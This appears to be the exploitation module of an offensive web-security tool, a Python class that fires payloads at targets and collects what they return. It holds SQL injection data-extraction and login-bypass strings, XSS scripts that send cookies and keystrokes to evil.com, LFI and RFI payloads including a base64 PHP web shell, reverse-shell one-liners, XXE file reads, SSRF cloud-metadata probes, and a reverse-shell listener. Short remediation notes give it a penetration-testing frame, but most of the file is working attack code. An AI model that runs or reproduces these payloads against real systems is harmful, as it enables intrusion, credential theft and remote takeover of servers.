#!/usr/bin/env python3
"""
Exploitation Module - Advanced Vulnerability Exploitation
Author: Sayer Linux (SayerLinux1@gmail.com)
"""

import requests
import json
import re
import time
import base64
import subprocess
import socket
import threading
from datetime import datetime
from colorama import Fore, Style
import urllib.parse
import hashlib

class Exploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Exploitation payloads database
        self.exploitation_payloads = {
            'sql_injection': {
                'data_extraction': [
                    "1' UNION SELECT 1,2,3,4,5--",
                    "1' UNION SELECT database(),user(),version(),4,5--",
                    "1' UNION SELECT table_name,column_name,3,4,5 FROM information_schema.tables--",
                    "1' UNION SELECT username,password,3,4,5 FROM users--",
                    "1' UNION SELECT load_file('/etc/passwd'),2,3,4,5--"
                ],
                'authentication_bypass': [
                    "admin' OR '1'='1'--",
                    "admin' OR 1=1--",
                    "' OR 1=1--",
                    "' OR '1'='1",
                    "1' OR 1=1--"
                ],
                'blind_sql': [
                    "1' AND SLEEP(5)--",
                    "1' AND IF(1=1,SLEEP(5),0)--",
                    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "1' WAITFOR DELAY '0:0:5'--"
                ]
            },
            'xss': {
                'cookie_stealing': [
                    "<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
                    "<img src=x onerror=\"this.src='http://evil.com/steal.php?c='+document.cookie\">",
                    "<svg onload=\"window.location='http://evil.com/steal.php?c='+document.cookie\">"
                ],
                'session_hijacking': [
                    "<script>fetch('http://evil.com/hijack.php',{method:'POST',body:document.cookie})</script>",
                    "<img src=x onerror=\"fetch('http://evil.com/hijack',{method:'POST',body:document.cookie})\">"
                ],
                'defacement': [
                    "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
                    "<style>*{display:none}</style><h1>HACKED</h1>",
                    "<script>document.title='HACKED'</script>"
                ],
                'keylogger': [
                    "<script>document.onkeypress=function(e){fetch('http://evil.com/log.php?k='+e.key)}</script>",
                    "<img src=x onerror=\"document.onkeypress=function(e){fetch('http://evil.com/log?k='+e.key)}\">"
                ]
            },
            'lfi': {
                'file_reading': [
                    "../../../etc/passwd",
                    "../../../windows/system32/drivers/etc/hosts",
                    "php://filter/read=convert.base64-encode/resource=config.php",
                    "php://filter/read=convert.base64-encode/resource=index.php",
                    "expect://id"
                ],
                'log_poisoning': [
                    "../../../var/log/apache2/access.log",
                    "../../../var/log/nginx/access.log",
                    "../../../var/log/auth.log",
                    "php://input"
                ],
                'php_filter': [
                    "php://filter/read=convert.base64-encode/resource=index.php",
                    "php://filter/convert.base64-encode/resource=config.php",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
                ]
            },
            'rfi': {
                'remote_shell': [
                    "http://evil.com/shell.txt",
                    "https://pastebin.com/raw/shellcode",
                    "ftp://evil.com/shell.txt",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
                ]
            },
            'command_injection': {
                'reverse_shell': [
                    "; nc -e /bin/sh evil.com 4444",
                    "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
                    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    "; php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                    "; ruby -rsocket -e'f=TCPSocket.open(\"evil.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
                ],
                'file_operations': [
                    "; cat /etc/passwd",
                    "; ls -la /var/www",
                    "; find / -name '*.key' 2>/dev/null",
                    "; netstat -tulpn",
                    "; ps aux"
                ],
                'system_info': [
                    "; uname -a",
                    "; id",
                    "; whoami",
                    "; pwd",
                    "; env"
                ]
            },
            'xxe': {
                'file_reading': [
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>'
                ],
                'ssrf': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
                ]
            },
            'ssrf': {
                'internal_scanning': [
                    "http://localhost:22",
                    "http://127.0.0.1:3306",
                    "http://169.254.169.254/latest/meta-data/",
                    "http://internal-server:8080",
                    "file:///etc/passwd"
                ],
                'cloud_metadata': [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://instance-data/latest/meta-data/"
                ],
                'port_scanning': [
                    "http://localhost:1",
                    "http://localhost:22",
                    "http://localhost:80",
                    "http://localhost:443",
                    "http://localhost:3306",
                    "http://localhost:8080"
                ]
            }
        }
    
    def exploit_vulnerability(self, vulnerability, target):
        """Main exploitation function"""
        print(f"{Fore.CYAN}[*] Starting exploitation of {vulnerability['type']}...{Style.RESET_ALL}")
        
        exploitation_result = {
            'vulnerability_id': vulnerability['id'],
            'type': vulnerability['type'],
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'exploitation_attempts': [],
            'successful_exploits': [],
            'failed_exploits': [],
            'proof_of_concept': None,
            'screenshots': [],
            'data_extracted': [],
            'system_access': False
        }
        
        # Exploit based on vulnerability type
        if 'SQL Injection' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_sql_injection(vulnerability, target)
            )
        elif 'XSS' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_xss(vulnerability, target)
            )
        elif 'LFI' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_lfi(vulnerability, target)
            )
        elif 'RFI' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_rfi(vulnerability, target)
            )
        elif 'Command Injection' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_command_injection(vulnerability, target)
            )
        elif 'XXE' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_xxe(vulnerability, target)
            )
        elif 'SSRF' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_ssrf(vulnerability, target)
            )
        elif 'IDOR' in vulnerability['type']:
            exploitation_result['exploitation_attempts'].extend(
                self.exploit_idor(vulnerability, target)
            )
        
        # Process results
        for attempt in exploitation_result['exploitation_attempts']:
            if attempt['success']:
                exploitation_result['successful_exploits'].append(attempt)
                if attempt.get('data_extracted'):
                    exploitation_result['data_extracted'].extend(attempt['data_extracted'])
                if attempt.get('system_access'):
                    exploitation_result['system_access'] = True
            else:
                exploitation_result['failed_exploits'].append(attempt)
        
        # Generate proof of concept
        if exploitation_result['successful_exploits']:
            exploitation_result['proof_of_concept'] = self.generate_poc(vulnerability, exploitation_result['successful_exploits'])
        
        return exploitation_result
    
    def exploit_sql_injection(self, vulnerability, target):
        """Exploit SQL injection vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['sql_injection']
        
        # Extract original payload and URL from vulnerability
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting SQL injection exploitation...{Style.RESET_ALL}")
        
        # Data extraction attempts
        for payload in payloads['data_extraction']:
            attempt = {
                'technique': 'Data Extraction',
                'payload': payload,
                'success': False,
                'response': None,
                'data_extracted': []
            }
            
            try:
                # Replace original payload with exploitation payload
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:500]
                
                # Check for successful data extraction
                if self.is_sql_data_extracted(response.text):
                    attempt['success'] = True
                    attempt['data_extracted'] = self.extract_sql_data(response.text)
                    print(f"{Fore.GREEN}[+] SQL data extraction successful!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        # Authentication bypass attempts
        for payload in payloads['authentication_bypass']:
            attempt = {
                'technique': 'Authentication Bypass',
                'payload': payload,
                'success': False,
                'response': None
            }
            
            try:
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:500]
                
                # Check for successful authentication bypass
                if self.is_auth_bypassed(response.text, response.status_code):
                    attempt['success'] = True
                    print(f"{Fore.GREEN}[+] Authentication bypass successful!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_xss(self, vulnerability, target):
        """Exploit XSS vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['xss']
        
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting XSS exploitation...{Style.RESET_ALL}")
        
        # Cookie stealing attempts
        for payload in payloads['cookie_stealing']:
            attempt = {
                'technique': 'Cookie Stealing',
                'payload': payload,
                'success': False,
                'response': None,
                'proof': None
            }
            
            try:
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:500]
                
                # Check if payload is reflected
                if payload in response.text:
                    attempt['success'] = True
                    attempt['proof'] = "Payload reflected in response"
                    print(f"{Fore.GREEN}[+] XSS payload successfully injected!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_lfi(self, vulnerability, target):
        """Exploit LFI vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['lfi']
        
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting LFI exploitation...{Style.RESET_ALL}")
        
        # File reading attempts
        for payload in payloads['file_reading']:
            attempt = {
                'technique': 'File Reading',
                'payload': payload,
                'success': False,
                'response': None,
                'data_extracted': []
            }
            
            try:
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:1000]
                
                # Check for successful file reading
                if self.is_file_content_extracted(response.text):
                    attempt['success'] = True
                    attempt['data_extracted'] = self.extract_file_content(response.text)
                    print(f"{Fore.GREEN}[+] File successfully read via LFI!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_rfi(self, vulnerability, target):
        """Exploit RFI vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['rfi']
        
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting RFI exploitation...{Style.RESET_ALL}")
        
        # Remote shell attempts
        for payload in payloads['remote_shell']:
            attempt = {
                'technique': 'Remote Shell Inclusion',
                'payload': payload,
                'success': False,
                'response': None,
                'system_access': False
            }
            
            try:
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:1000]
                
                # Check for successful remote inclusion
                if self.is_remote_file_included(response.text):
                    attempt['success'] = True
                    attempt['system_access'] = True
                    print(f"{Fore.GREEN}[+] Remote file successfully included!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_command_injection(self, vulnerability, target):
        """Exploit command injection vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['command_injection']
        
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting command injection exploitation...{Style.RESET_ALL}")
        
        # System info attempts
        for payload in payloads['system_info']:
            attempt = {
                'technique': 'System Information',
                'payload': payload,
                'success': False,
                'response': None,
                'data_extracted': []
            }
            
            try:
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:1000]
                
                # Check for successful command execution
                if self.is_command_executed(response.text):
                    attempt['success'] = True
                    attempt['data_extracted'] = self.extract_command_output(response.text)
                    print(f"{Fore.GREEN}[+] Command successfully executed!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_xxe(self, vulnerability, target):
        """Exploit XXE vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['xxe']
        
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting XXE exploitation...{Style.RESET_ALL}")
        
        # File reading attempts
        for payload in payloads['file_reading']:
            attempt = {
                'technique': 'File Reading via XXE',
                'payload': payload,
                'success': False,
                'response': None,
                'data_extracted': []
            }
            
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(vulnerable_url, data=payload, headers=headers, timeout=10)
                
                attempt['response'] = response.text[:1000]
                
                # Check for successful file reading
                if self.is_xxe_successful(response.text):
                    attempt['success'] = True
                    attempt['data_extracted'] = self.extract_xxe_data(response.text)
                    print(f"{Fore.GREEN}[+] XXE exploitation successful!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_ssrf(self, vulnerability, target):
        """Exploit SSRF vulnerabilities"""
        attempts = []
        payloads = self.exploitation_payloads['ssrf']
        
        original_payload = vulnerability.get('payload', '')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting SSRF exploitation...{Style.RESET_ALL}")
        
        # Internal scanning attempts
        for payload in payloads['internal_scanning']:
            attempt = {
                'technique': 'Internal Scanning',
                'payload': payload,
                'success': False,
                'response': None,
                'data_extracted': []
            }
            
            try:
                exploit_url = vulnerable_url.replace(original_payload, payload)
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:1000]
                
                # Check for successful SSRF
                if self.is_ssrf_successful(response.text):
                    attempt['success'] = True
                    attempt['data_extracted'] = self.extract_ssrf_data(response.text)
                    print(f"{Fore.GREEN}[+] SSRF exploitation successful!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def exploit_idor(self, vulnerability, target):
        """Exploit IDOR vulnerabilities"""
        attempts = []
        
        original_param = vulnerability.get('parameter', 'id')
        original_value = vulnerability.get('value', '1')
        vulnerable_url = vulnerability.get('url', target)
        
        print(f"{Fore.YELLOW}[*] Attempting IDOR exploitation...{Style.RESET_ALL}")
        
        # Test different values
        test_values = ['1', '2', '3', 'admin', '999', '1000', 'root', 'administrator']
        
        for value in test_values:
            attempt = {
                'technique': 'Parameter Manipulation',
                'payload': f"{original_param}={value}",
                'success': False,
                'response': None,
                'data_extracted': []
            }
            
            try:
                exploit_url = vulnerable_url.replace(f"{original_param}={original_value}", f"{original_param}={value}")
                response = self.session.get(exploit_url, timeout=10)
                
                attempt['response'] = response.text[:1000]
                
                # Check for successful IDOR exploitation
                if self.is_idor_successful(response.text, value):
                    attempt['success'] = True
                    attempt['data_extracted'] = self.extract_idor_data(response.text, value)
                    print(f"{Fore.GREEN}[+] IDOR exploitation successful with value: {value}!{Style.RESET_ALL}")
                
            except Exception as e:
                attempt['error'] = str(e)
            
            attempts.append(attempt)
        
        return attempts
    
    def is_sql_data_extracted(self, response_text):
        """Check if SQL data was successfully extracted"""
        indicators = ['root:', 'daemon:', 'bin:', 'admin', 'user', 'password', 'mysql', 'information_schema']
        return any(indicator in response_text.lower() for indicator in indicators)
    
    def extract_sql_data(self, response_text):
        """Extract SQL data from response"""
        extracted = []
        
        # Extract table names
        table_matches = re.findall(r'(\w+_\w+|users|admin|passwords)', response_text, re.IGNORECASE)
        if table_matches:
            extracted.extend([f"Table: {table}" for table in table_matches[:5]])
        
        # Extract usernames/emails
        email_matches = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response_text)
        if email_matches:
            extracted.extend([f"Email: {email}" for email in email_matches[:3]])
        
        return extracted
    
    def is_auth_bypassed(self, response_text, status_code):
        """Check if authentication was bypassed"""
        success_indicators = ['dashboard', 'admin', 'welcome', 'logged in', 'profile', 'logout']
        return (status_code == 200 and 
                any(indicator in response_text.lower() for indicator in success_indicators))
    
    def is_file_content_extracted(self, response_text):
        """Check if file content was extracted"""
        indicators = ['root:', 'daemon:', 'bin:', 'sys:', 'windows', 'system32', 'boot.ini']
        return any(indicator in response_text.lower() for indicator in indicators)
    
    def extract_file_content(self, response_text):
        """Extract file content from response"""
        extracted = []
        
        # Extract /etc/passwd entries
        passwd_matches = re.findall(r'^([^:]+):[^:]*:[0-9]+:[0-9]+:[^:]*:[^:]*:[^:]*$', response_text, re.MULTILINE)
        if passwd_matches:
            extracted.extend([f"User: {user}" for user in passwd_matches[:5]])
        
        return extracted
    
    def is_remote_file_included(self, response_text):
        """Check if remote file was included"""
        indicators = ['hacked', 'shell_exec', 'system(', 'exec(', 'passthru(', 'shell']
        return any(indicator in response_text.lower() for indicator in indicators)
    
    def is_command_executed(self, response_text):
        """Check if command was executed"""
        indicators = ['uid=', 'gid=', 'groups=', 'root:', 'daemon:', 'windows', 'directory of']
        return any(indicator in response_text.lower() for indicator in indicators)
    
    def extract_command_output(self, response_text):
        """Extract command output from response"""
        extracted = []
        
        # Extract system info
        system_matches = re.findall(r'(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\))', response_text)
        if system_matches:
            extracted.append(f"System Info: {system_matches[0]}")
        
        return extracted
    
    def is_xxe_successful(self, response_text):
        """Check if XXE exploitation was successful"""
        indicators = ['root:', 'daemon:', 'bin:', 'xml', 'entity', 'system']
        return any(indicator in response_text.lower() for indicator in indicators)
    
    def extract_xxe_data(self, response_text):
        """Extract XXE data from response"""
        extracted = []
        
        # Extract file content
        file_matches = re.findall(r'(root:[^:]+:[0-9]+:[0-9]+:[^:]*:[^:]*:[^:]*)', response_text)
        if file_matches:
            extracted.extend([f"File Content: {match}" for match in file_matches[:3]])
        
        return extracted
    
    def is_ssrf_successful(self, response_text):
        """Check if SSRF exploitation was successful"""
        indicators = ['localhost', '127.0.0.1', 'internal', 'metadata', 'root:', 'daemon:']
        return any(indicator in response_text.lower() for indicator in indicators)
    
    def extract_ssrf_data(self, response_text):
        """Extract SSRF data from response"""
        extracted = []
        
        # Extract internal service responses
        if 'localhost' in response_text.lower() or '127.0.0.1' in response_text.lower():
            extracted.append("Internal service accessed")
        
        return extracted
    
    def is_idor_successful(self, response_text, value):
        """Check if IDOR exploitation was successful"""
        # Simple heuristic - different content for different values
        success_indicators = ['admin', 'user', 'profile', 'email', 'password', 'role']
        return any(indicator in response_text.lower() for indicator in success_indicators)
    
    def extract_idor_data(self, response_text, value):
        """Extract IDOR data from response"""
        extracted = []
        
        # Extract user information
        email_matches = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response_text)
        if email_matches:
            extracted.extend([f"Email: {email}" for email in email_matches[:2]])
        
        return extracted
    
    def generate_poc(self, vulnerability, successful_exploits):
        """Generate proof of concept"""
        poc = {
            'vulnerability_type': vulnerability['type'],
            'exploitation_steps': [],
            'proof': [],
            'impact': self.assess_impact(vulnerability['type']),
            'recommendation': self.generate_recommendation(vulnerability['type'])
        }
        
        for exploit in successful_exploits:
            poc['exploitation_steps'].append({
                'technique': exploit['technique'],
                'payload': exploit['payload'],
                'result': 'Success' if exploit['success'] else 'Failed'
            })
            
            if exploit.get('data_extracted'):
                poc['proof'].extend(exploit['data_extracted'])
        
        return poc
    
    def assess_impact(self, vuln_type):
        """Assess the impact of the vulnerability"""
        impact_map = {
            'SQL Injection': 'Critical - Full database access and potential system compromise',
            'Cross-Site Scripting (XSS)': 'High - Session hijacking and user account takeover',
            'Local File Inclusion (LFI)': 'High - Source code disclosure and potential RCE',
            'Remote File Inclusion (RFI)': 'Critical - Remote code execution and system compromise',
            'Command Injection': 'Critical - Full system access and command execution',
            'XML External Entity (XXE)': 'High - File system access and internal service scanning',
            'Server-Side Request Forgery (SSRF)': 'High - Internal network access and cloud metadata exposure',
            'Insecure Direct Object Reference (IDOR)': 'High - Unauthorized data access and privilege escalation'
        }
        
        return impact_map.get(vuln_type, 'Medium - Potential security risk')
    
    def generate_recommendation(self, vuln_type):
        """Generate security recommendations"""
        recommendations = {
            'SQL Injection': 'Use parameterized queries and input validation',
            'Cross-Site Scripting (XSS)': 'Implement output encoding and input sanitization',
            'Local File Inclusion (LFI)': 'Use whitelisting for file paths and validate input',
            'Remote File Inclusion (RFI)': 'Disable remote file inclusion and validate input',
            'Command Injection': 'Avoid direct command execution with user input',
            'XML External Entity (XXE)': 'Disable external entity processing in XML parsers',
            'Server-Side Request Forgery (SSRF)': 'Implement URL whitelisting and input validation',
            'Insecure Direct Object Reference (IDOR)': 'Implement proper access controls and authorization'
        }
        
        return recommendations.get(vuln_type, 'Implement proper input validation and security controls')
    
    def create_reverse_shell_listener(self, port=4444):
        """Create a reverse shell listener"""
        print(f"{Fore.CYAN}[*] Setting up reverse shell listener on port {port}...{Style.RESET_ALL}")
        
        def listener():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(('0.0.0.0', port))
                sock.listen(1)
                
                print(f"{Fore.GREEN}[+] Reverse shell listener started on port {port}{Style.RESET_ALL}")
                
                conn, addr = sock.accept()
                print(f"{Fore.GREEN}[+] Reverse shell connection received from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                
                # Handle the shell
                while True:
                    command = input("shell> ")
                    if command.lower() == 'exit':
                        break
                    
                    conn.send(command.encode() + b'\n')
                    response = conn.recv(4096).decode()
                    print(response)
                
                conn.close()
                sock.close()
                
            except Exception as e:
                print(f"{Fore.RED}[-] Reverse shell listener error: {str(e)}{Style.RESET_ALL}")
        
        # Start listener in background thread
        listener_thread = threading.Thread(target=listener, daemon=True)
        listener_thread.start()
        
        return listener_thread